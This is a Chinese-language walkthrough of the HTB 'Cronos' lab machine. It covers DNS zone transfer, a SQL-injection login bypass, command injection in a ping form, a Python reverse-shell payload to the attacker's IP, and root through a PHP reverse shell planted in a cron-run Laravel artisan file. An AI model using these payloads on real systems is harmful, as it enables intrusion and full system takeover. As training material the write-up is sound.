# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 探测

开放端口
```
┌──(root㉿ss)-[~]
└─# nmap -p- --open --min-rate=1000 10.10.10.13 -Pn            
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 21:54 EDT
Nmap scan report for 10.10.10.13
Host is up (0.0048s latency).
Not shown: 64793 closed tcp ports (reset), 739 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.80 seconds

```


详细端口信息
```
┌──(root㉿ss)-[~]
└─# nmap -sV -Pn -A -O 10.10.10.13 -p 22,53,80    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 21:56 EDT
Nmap scan report for 10.10.10.13
Host is up (0.0034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   3.30 ms 10.10.14.1
2   3.77 ms 10.10.10.13

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.89 seconds

```

# web
80端口没有任何有用的信息


# 域传送漏洞

什么是域传送？
> DNS主备服务器会通过DNS域传送来进行数据库的同步。域传送是指后备服务器从主服务器复制数据，并用得到的数据更新自身数据库


什么是域传送漏洞?
> DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞，也就是说，攻击者可以利用这个漏洞来获取该DNS中记录的敏感信息

利用格式：
linux下
```
dig @目标DNS服务器ip axfr 查询的域名
```

看[这里](https://www.mi1k7ea.com/2021/04/03/%E6%B5%85%E6%9E%90DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/)

靶机开启了DNS服务

使用dig命令挖掘靶机域名

```
┌──(root㉿ss)-[~/htb/cronos]
└─# dig axfr cronos.htb @10.10.10.13

; <<>> DiG 9.18.0-2-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 16 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Fri May 27 05:29:17 EDT 2022
;; XFR size: 7 records (messages 1, bytes 203)
```

分别把以下三个域名写进host文件
```
10.10.10.13 admin.cronos.htb
10.10.10.13 cronos.htb
10.10.10.13 ns1.cronos.htb

```

## ns1.cronos.htb

就是IP域名进来打招呼的页面

## www.cronos.htb


web brute
```
┌──(root㉿ss)-[~/htb/cronos]
└─# python3 /root/dirsearch/dirsearch.py -e* -u http://cronos.htb/ -t 100

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/cronos.htb/-_22-05-27_03-33-01.txt

Error Log: /root/dirsearch/logs/errors-22-05-27_03-33-01.log

Target: http://cronos.htb/

[03:33:01] Starting:            
[03:33:02] 301 -  305B  - /js  ->  http://cronos.htb/js/                       
[03:33:28] 301 -  306B  - /css  ->  http://cronos.htb/css/                  
[03:33:32] 200 -    0B  - /favicon.ico                                      
[03:33:36] 200 -    2KB - /index.php                                        
[03:33:37] 200 -  924B  - /js/                                              
[03:33:54] 200 -   24B  - /robots.txt                                                                          
[03:34:06] 200 -  914B  - /web.config   
```

js和css下有一个app命名的文件

首页导向了4个页面,看起来都是laravel的站点，难道这个网站是用laravel做的？
```
<div class="links">
                    <a href="https://laravel.com/docs">Documentation</a>
                    <a href="https://laracasts.com">Laracasts</a>
                    <a href="https://laravel-news.com">News</a>
                    <a href="https://forge.laravel.com">Forge</a>
                    <a href="https://github.com/laravel/laravel">GitHub</a>
                </div>
```


使用whatweb探测
```
┌──(root💀kali)-[~/htb/cronos]
└─# whatweb http://cronos.htb/                                                                       
http://cronos.htb/ [200 OK] Apache[2.4.18], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.10.13], Laravel, Title[Cronos], X-UA-Compatible[IE=edge]

```
Cookies的值里面有XSRF-TOKEN,laravel_session，我们假定靶机运行的就是laravel

找到一个hacktricks离关于laravel[反序列化漏洞](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel)的利用技巧

需要一个APP_KEY，从github里laravel的目录可以知道.env文件在项目根目录

但是按照hacktricks里的方法我们无法得到这个env文件

等我们找到APP_KEY的时候再回来

## admin.cronos.htb

一个登陆页面，使用下面payload绕过登录
```
admin' or 1=1 -- - 
```

跑到这个页面,可以使用ping还有traceroute命令
```
http://admin.cronos.htb/welcome.php
```

使用ping命令，输入```10.10.16.4 -c 4```

本地监听收到icmp包
```
┌──(root💀kali)-[~/htb/cronos]
└─# tcpdump -i tun0 icmp                                                                                      130 ⨯
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
05:43:11.560968 IP admin.cronos.htb > 10.10.16.4: ICMP echo request, id 18306, seq 1, length 64
05:43:11.561009 IP 10.10.16.4 > admin.cronos.htb: ICMP echo reply, id 18306, seq 1, length 64
05:43:12.317547 IP admin.cronos.htb > 10.10.16.4: ICMP echo request, id 18306, seq 2, length 64
05:43:12.317571 IP 10.10.16.4 > admin.cronos.htb: ICMP echo reply, id 18306, seq 2, length 64
05:43:13.319360 IP admin.cronos.htb > 10.10.16.4: ICMP echo request, id 18306, seq 3, length 64
05:43:13.319379 IP 10.10.16.4 > admin.cronos.htb: ICMP echo reply, id 18306, seq 3, length 64
05:43:14.319754 IP admin.cronos.htb > 10.10.16.4: ICMP echo request, id 18306, seq 4, length 64
05:43:14.319769 IP 10.10.16.4 > admin.cronos.htb: ICMP echo reply, id 18306, seq 4, length 64
```

下面payload表明存在命令注入
```
8.8.8.8|id
```

使用下面payload拿到rev shell
```
8.8.8.8|python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

收到rev shell
```
┌──(root💀kali)-[~/htb/cronos]
└─# nc -lnvp 443                                                                                              130 ⨯
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.13] 49132
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
whoami
www-data

```


# 提权

传linpeas

有个定时任务
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1


```
看来laravel是以root身份运行的,这个定时任务一分钟执行一次


把下面两行代码写入/var/www/laravel/artisan
```
$sock=fsockopen('10.10.16.4', 443);
exec('/bin/sh -i <&3 >&3 2>&3');
```


一分钟后，收到root shell
```
┌──(root💀kali)-[~/htb/cronos]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.13] 49136
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cd /root
# cat root.txt
6928d5d350c57...
# 

```

## CVE-2018-15133


我们上面怀疑一个laravel存在一个rce，但是缺少一个.env文件

来到项目目录

```
$ ls -alh
ls -alh
total 2.0M
drwxr-xr-x 13 www-data www-data 4.0K May 10 14:51 .
drwxr-xr-x  5 root     root     4.0K May 10 14:51 ..
-rw-r--r--  1 www-data www-data  572 Apr  9  2017 .env
drwxr-xr-x  8 www-data www-data 4.0K May 10 14:51 .git
-rw-r--r--  1 www-data www-data  111 Apr  9  2017 .gitattributes
-rw-r--r--  1 www-data www-data  117 Apr  9  2017 .gitignore
-rw-r--r--  1 www-data www-data  727 Apr  9  2017 CHANGELOG.md
drwxr-xr-x  6 www-data www-data 4.0K May 10 14:51 app
-rwxr-xr-x  1 www-data www-data 1.7K Apr  9  2017 artisan
drwxr-xr-x  3 www-data www-data 4.0K May 10 14:51 bootstrap
-rw-r--r--  1 www-data www-data 1.3K Apr  9  2017 composer.json
-rw-r--r--  1 www-data www-data 119K Apr  9  2017 composer.lock
-rwxr-xr-x  1 www-data www-data 1.8M Apr  9  2017 composer.phar
drwxr-xr-x  2 www-data www-data 4.0K May 10 14:51 config
drwxr-xr-x  5 www-data www-data 4.0K May 10 14:51 database
-rw-r--r--  1 www-data www-data 1.1K Apr  9  2017 package.json
-rw-r--r--  1 www-data www-data 1.1K Apr  9  2017 phpunit.xml
drwxr-xr-x  4 www-data www-data 4.0K May 10 14:51 public
-rw-r--r--  1 www-data www-data 3.4K Apr  9  2017 readme.md
drwxr-xr-x  5 www-data www-data 4.0K May 10 14:51 resources
drwxr-xr-x  2 www-data www-data 4.0K May 10 14:51 routes
-rw-r--r--  1 www-data www-data  563 Apr  9  2017 server.php
drwxr-xr-x  5 www-data www-data 4.0K May 10 14:51 storage
drwxr-xr-x  4 www-data www-data 4.0K May 10 14:51 tests
drwxr-xr-x 31 www-data www-data 4.0K May 10 14:51 vendor
-rw-r--r--  1 www-data www-data  555 Apr  9  2017 webpack.mix.js

```

查看.env文件，找到APP_KEY

```
$ cat .env
cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:+fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=
APP_DEBUG=true
APP_LOG_LEVEL=debug
APP_URL=http://localhost

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=homestead
DB_USERNAME=homestead
DB_PASSWORD=secret

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=

```


使用github上这个[exp](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

无法执行
```
┌──(root💀kali)-[~/htb/cronos/exploit_laravel_cve-2018-15133-main]
└─# python3 pwn_laravel.py 'http://cronos.htb' '+fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=' -c id



```


查看composer.json确认laravel版本为5.4.x，而上面exp要求的版本是```In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29```
```
cat composer.json
{
    "name": "laravel/laravel",
    "description": "The Laravel Framework.",
    "keywords": ["framework", "laravel"],
    "license": "MIT",
    "type": "project",
    "require": {
        "php": ">=5.6.4",
        "laravel/framework": "5.4.*",
        "laravel/tinker": "~1.0"
    },
    "require-dev": {
        "fzaninotto/faker": "~1.4",
        "mockery/mockery": "0.9.*",
        "phpunit/phpunit": "~5.7"
    },

```

